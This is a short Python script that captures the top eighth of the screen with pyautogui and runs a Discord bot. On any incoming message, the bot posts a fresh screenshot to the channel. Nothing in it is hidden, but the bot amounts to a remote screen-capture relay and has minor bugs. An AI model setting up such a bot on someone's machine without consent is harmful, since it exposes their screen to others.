import pyautogui
import tkinter as tk

root = tk.Tk()
canvas1 = tk.Canvas(root, width = 10, height = 10)
canvas1.pack()

scrheight = root.winfo_screenheight()
scrwidth = root.winfo_screenwidth()

path = "your path here"

def screenShot():
    myScrnSht = pyautogui.screenshot(region = (0,0,scrwidth, scrheight/8))
    myScrnSht.save(r'your path here')

screenShot()
root.destroy()


import discord

TOKEN = 'your token here'

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    
    screenShot()
    await message.channel.send(file=discord.File(r'your path here'))

client.run(TOKEN)

root.mainloop()
